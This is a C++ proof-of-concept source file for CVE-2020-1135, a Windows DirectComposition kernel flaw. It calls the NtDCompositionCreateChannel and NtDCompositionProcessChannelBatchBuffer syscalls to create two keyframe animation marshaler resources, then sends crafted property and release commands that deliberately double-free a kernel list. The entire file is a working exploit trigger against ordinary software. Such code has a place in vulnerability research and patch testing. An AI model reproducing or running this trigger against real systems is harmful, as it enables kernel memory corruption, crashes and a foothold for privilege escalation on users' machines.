#include<windows.h>
#include<iostream>
#include<intrin.h>
using namespace std;


//////////////////////////////////////////////////////////////////////////
//
//  prototypes of x64.asm
//

EXTERN_C
NTSTATUS
NTAPI NtDCompositionCreateChannel(
    OUT PHANDLE hChannel,
    IN OUT PSIZE_T SectionSize,
    OUT PVOID* SectionBaseMapInProcess
);

EXTERN_C
NTSTATUS
NTAPI NtDCompositionProcessChannelBatchBuffer(
    IN HANDLE hChannel,
    IN DWORD ArgStart,
    OUT PDWORD pOutArg1,
    OUT PDWORD pOutArg2
);


//////////////////////////////////////////////////////////////////////////
//
//  dcmop command in NtDCompositionProcessChannelBatchBuffer
//

enum class dcmop_command: int
{
    ProcessCommandBufferIterator,
    CreateResource,
    OpenSharedResource,
    ReleaseResource,
    GetAnimationTime,
    CapturePointer,
    OpenSharedResourceHandle,
    SetCallbackId,
    SetResourceReferenceArrayProperty = 14
};


//////////////////////////////////////////////////////////////////////////
//
//  resource object type
//

enum class resource_type : int
{
    //....
    CKeyframeAnimationMarshaler = 0x5A,
    //...
};


//////////////////////////////////////////////////////////////////////////
//
//  parameter prototypes of SetResourceReferenceArrayProperty
//

typedef struct _Arg_SetResourceReferenceArrayProperty
{
    dcmop_command cmd;
    DWORD resource_id;
    DWORD propert_id;
    DWORD number_of_property;
    DWORD property_array[1];
}Arg_SetResourceReferenceArrayProperty,*pArg_SetResourceReferenceArrayProperty;
static_assert(sizeof(Arg_SetResourceReferenceArrayProperty) == 0x14, "size check");


//////////////////////////////////////////////////////////////////////////
//
//  parameter prototypes of CreateResource
//

typedef struct _Arg_CreateResource
{
    dcmop_command cmd;
    DWORD resource_id;
    resource_type res_type;
    DWORD be_shared_resource;
}Arg_CreateResource, *pArg_CreateResource;
static_assert(sizeof(Arg_CreateResource) == 0x10, "size check");


//////////////////////////////////////////////////////////////////////////
//
//  parameter prototypes of ReleaseResource
//

typedef struct _Arg_ReleaseResource
{
    dcmop_command cmd;
    DWORD resource_id;
}Arg_ReleaseResource, *pArg_ReleaseResource;
static_assert(sizeof(Arg_ReleaseResource) == 0x8, "size check");


//////////////////////////////////////////////////////////////////////////
//
//  CVE-2020-1135 POC
//

int main()
{
    HANDLE Channel;
    SIZE_T SectionSize;
    PVOID  SectionBaseMapInProcess;
    DWORD hResource1 = 1;
    DWORD hResource2 = 2;
    DWORD arg1, arg2;
    pArg_CreateResource Arg_CR;
    pArg_SetResourceReferenceArrayProperty  Arg_SRRAP;
    pArg_ReleaseResource Arg_RR;
   

    //////////////////////////////////////////////////////////////////////////
    //
    //  Convert to GUI thread
    //

    CreateMenu();


    //////////////////////////////////////////////////////////////////////////
    //
    //  Create  CApplicationChannel Object 
    //

    NtDCompositionCreateChannel(
        &Channel,
        &SectionSize,
        &SectionBaseMapInProcess
    );


    //////////////////////////////////////////////////////////////////////////
    //
    //  Create first CKeyframeAnimationMarshaler resource
    //

    Arg_CR = static_cast<pArg_CreateResource>(SectionBaseMapInProcess);
    Arg_CR->cmd = dcmop_command::CreateResource;
    Arg_CR->resource_id = hResource1;
    Arg_CR->res_type = resource_type::CKeyframeAnimationMarshaler;
    Arg_CR->be_shared_resource = false;

    NtDCompositionProcessChannelBatchBuffer(Channel, 0x10, &arg1, &arg2);


    //////////////////////////////////////////////////////////////////////////
    //
    //  Create second CKeyframeAnimationMarshaler resource
    //

    Arg_CR = static_cast<pArg_CreateResource>(SectionBaseMapInProcess);
    Arg_CR->cmd = dcmop_command::CreateResource;
    Arg_CR->resource_id = hResource2;
    Arg_CR->res_type = resource_type::CKeyframeAnimationMarshaler;
    Arg_CR->be_shared_resource = false;

    NtDCompositionProcessChannelBatchBuffer(Channel, 0x10, &arg1, &arg2);


    //////////////////////////////////////////////////////////////////////////
    //
    //  Set m_ppNestedExpressionList first to pass some check
    //
  
    Arg_SRRAP = static_cast<pArg_SetResourceReferenceArrayProperty>(SectionBaseMapInProcess);
    Arg_SRRAP->cmd = dcmop_command::SetResourceReferenceArrayProperty;
    Arg_SRRAP->resource_id = hResource1;
    Arg_SRRAP->propert_id = 14;
    Arg_SRRAP->number_of_property = 1;
    Arg_SRRAP->property_array[0] = 0x2;

    NtDCompositionProcessChannelBatchBuffer(
        Channel,
        0x10 + 4 * Arg_SRRAP->number_of_property,
        &arg1,
        &arg2
    );


    //////////////////////////////////////////////////////////////////////////
    //
    //  first free m_ppNestedExpressionList
    //

    Arg_SRRAP = static_cast<pArg_SetResourceReferenceArrayProperty>(SectionBaseMapInProcess);
    Arg_SRRAP->cmd = dcmop_command::SetResourceReferenceArrayProperty;
    Arg_SRRAP->resource_id = hResource1;
    Arg_SRRAP->propert_id = 14;
    Arg_SRRAP->number_of_property = 1;
    Arg_SRRAP->property_array[0] = 0x2;

    NtDCompositionProcessChannelBatchBuffer(
        Channel,
        0x10 + 4 * Arg_SRRAP->number_of_property,
        &arg1,
        &arg2
    );


    //////////////////////////////////////////////////////////////////////////
    //
    //  double free m_ppNestedExpressionList
    //

    Arg_RR = static_cast<pArg_ReleaseResource>(SectionBaseMapInProcess);
    Arg_RR->cmd = dcmop_command::ReleaseResource;
    Arg_RR->resource_id = hResource1;

    NtDCompositionProcessChannelBatchBuffer(Channel, 0x8, &arg1, &arg2);


    //////////////////////////////////////////////////////////////////////////
    //
    //  output the error message
    //

    cout << "if go here, the poc is failed, try again" << endl;

    return false;
}